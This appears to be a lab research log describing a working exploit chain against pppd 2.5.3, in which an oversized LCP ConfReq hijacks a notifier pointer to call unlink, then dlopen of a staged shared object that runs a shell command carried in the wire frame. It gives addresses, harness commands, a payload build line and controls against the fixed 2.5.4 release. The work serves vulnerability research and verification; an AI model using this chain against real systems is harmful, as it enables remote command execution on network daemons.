# W132 — controlled call through the hijacked `sigreceived` notifier

Local PTY replay (vulnerable pinned 2.5.3, `-no-pie`):

```
python3 lab/frontier/pppd2shell/live/rce_call.py \
  --binary "$PWD/lab/frontier/pppd2shell/live/raw/build-vuln-nopie/pppd/pppd" \
  --marker <unique> --mode attack [--strace]
python3 lab/frontier/pppd2shell/live/call/normalize_call.py
```

## What is new

W125 and W131 hijacked notifier pointers but their callbacks dereferenced the
overflow-corrupted `the_channel` before doing anything useful. W132 keeps the
same wire write and uses a **one-argument** callback instead. `notify()` calls
`(*np->func)(np->arg, val)` (`main.c:2155-2163`), so a one-arg libc PLT stub
receives the attacker-chosen `np->arg` in `rdi` and ignores the signal number
in `rsi`.

- NAK frame (same 1498-byte LCP ConfReq as W131) sets `sigreceived` (+1856) to
  `0x46882c`, a fake notifier placed verbatim in `inpacket_buf` by a rejected
  ConfReq body.
- Fake notifier: `next = NULL`, `func = unlink@plt (0x40c4a0)`,
  `arg = 0x468844` (lab sentinel path string in the same body).
- `SIGTERM` reaches `term()` (`main.c:1593-1600`), which calls
  `notify(sigreceived, sig)` with no `the_channel` dereference on that path.
- Live result: `strace` on the target PID shows
  `unlink("/tmp/pppd2shell-r5-…-victim") = 0`; the sentinel file disappears.
  The process then faults later in shutdown on the corrupted `the_channel`
  (`rc -11`), which does not undo the call.

## Controls

| case | result |
| --- | --- |
| vulnerable pin, `unlink@plt`, overflow frame | sentinel deleted; two straced replays byte-identical after normalization |
| vulnerable pin, short safe ConfReq (no overflow) | sentinel intact, daemon alive |
| vulnerable pin, `func = NULL`, overflow frame | SIGSEGV, sentinel intact |
| fixed 2.5.4 pin, identical frames | `LCP: ignoring duplicate configuration option(s)`, sentinel intact, daemon alive |

## Grade

Attacker wire input makes a live process call an attacker-chosen function with
an attacker-chosen string argument, with an observed filesystem side effect.
That is control beyond W123/W126 pointer writes, but `unlink` is a libc call,
not a command: **rung 4, not rung 5**. The pinned binary has no `system`/`popen`
import, and the only exec sites (`device_script`, `run_program`) need a child
path or stack-frame state this primitive cannot supply. Normalized evidence and
hashes are in `evidence/`; raw logs, frames and strace stay in gitignored
`../raw/`.

## W133 — dlopen constructor from wire bytes (rung 5 candidate)

The W132 statement that the pin has no reachable command path is superseded
for this build: `nm -D` shows `dlopen@GLIBC_2.34`, PLT `0x40cd70`. With
`SIGINT` (2) the signal number passed by `notify()` becomes `RTLD_NOW`, so
`func = dlopen@plt` loads a pre-staged lab `.so`. Its constructor reads the
command string at `0x468888` (`inpacket_buf + 8 + 96`, inside the rejected
ConfReq body) and calls `system()`, i.e. the command bytes travel in the wire
frame. The staged `.so` at a known path is a material precondition.

```
gcc -shared -fPIC -O0 -g -DWIRE_CMD -DCMD_ADDR=0x468888UL \
  -o /tmp/pppd2shell-r5-<marker>-payload.so payload.c
python3 ../rce_call.py \
  --binary "$PWD/../raw/build-vuln-nopie/pppd/pppd" \
  --marker <marker> --mode attack --callback 0x40cd70 --signal INT \
  --expect created --arg-path /tmp/pppd2shell-r5-<marker>-payload.so \
  --wire-cmd 'echo PPPD2SHELL_W133_WIRE_COMMAND_RAN > /tmp/pppd2shell-r5-<marker>-victim' \
  --strace --trace-exec
python3 normalize_dlopen.py
```

Live strace shows `openat(...payload.so...)`, `execve("/bin/sh", ["sh", "-c",
…])`, then `openat(...-victim..., O_WRONLY|O_CREAT|O_TRUNC, 0666)`; the
sentinel contains exactly the wire command's echoed string. Two straced
attacks are byte-identical after normalization (`evidence/HASHES_DLOPEN.txt`,
`6a8ed407…`). Fixed 2.5.4, short-safe and NULL-callback controls create no
sentinel and exec no shell.

Grade: observed command execution in a live daemon from attacker wire bytes —
a rung 5 candidate, **not ESTABLISHED** until independent witness replay;
the staged-payload precondition must be reported with it.

Changing only the wire command (w133g) with the same staged object changes the
sentinel content to `PPPD2SHELL_W133_SECOND_COMMAND\n`, confirming the command
bytes travel in the frame.

